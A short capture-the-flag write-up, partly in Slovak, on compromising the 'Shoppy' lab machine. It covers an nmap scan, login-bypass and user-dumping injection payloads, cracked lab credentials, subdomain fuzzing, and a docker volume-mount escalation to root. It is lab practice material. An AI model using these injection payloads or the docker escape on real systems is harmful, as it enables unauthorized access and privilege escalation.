---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Shoppy

## sudo nmap -sV -sC -sS 10.10.11.180

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-11 09:14 CET Nmap scan report for 10.10.11.180 Host is up (0.029s latency). Not shown: 998 closed tcp ports (reset) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA) |   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA) |_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519) 80/tcp open  http    nginx 1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb |_http-server-header: nginx/1.23.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds

## dirbuster (directory-list-2.3-medium.txt)

 ![](https://s3.hedgedoc.org/demo/uploads/8b960070-2177-4d18-92bb-a8d9dc326799.png)

### SQLi?

Timeoutuje pri zadani `'` do `username`.

Prešlo: `admin'||'` -> /admin

**/admin**

1. search `'` vracia internal server error
2. Search `admin` vrati vysledok .json, ktory obsahuje username/pass http://shoppy.htb/admin/search-users?username=admin

search `'||'1==1` --> vrati hashe josh a admin

```	
_id	"62db0e93d6d6a999a66ee67a"  
username	"admin"  
password	"23c6877d9e2b564ef8b32c3a23de27b2"
```

```
_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"
```

**josh:remembermethisway** Ale na SSH to nefunguje

### ffuf

```
─$ ffuf -w subdomains.txt -H "Host: FUZZ.shoppy.htb" -u http://shoppy.htb -fs 169

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: subdomains2.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

mattermost             [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 29ms]
```

We found mattermost, there the account `josh:remembermethisway` worked.

 ![](https://s3.hedgedoc.org/demo/uploads/222c6ca0-776f-438b-b16f-6d4c5caa91f2.png)

Here, we found `jaeger:Sh0ppyBest@pp!` **That was SSH user**, but not the one with a flag

## user

We found user **deploy**

username: deploy password: Deploying@pp! #sa zobrazi po vypisu binarky `less /home/deploy/password-manager`

### deploy -> root

1. z mattermostu/enumeracie vieme, ze tam je docker.
2. skusime pustit `docker image ls`, vidime ze je stiahnuty image alpine
3. `$ docker run -it -v /root/:/tmp/root/ alpine` nam **pusti kontajner s mountnutym /root/ do /tmp/root**
4. precitat https://www.redhat.com/en/blog/understanding-root-inside-and-outside-container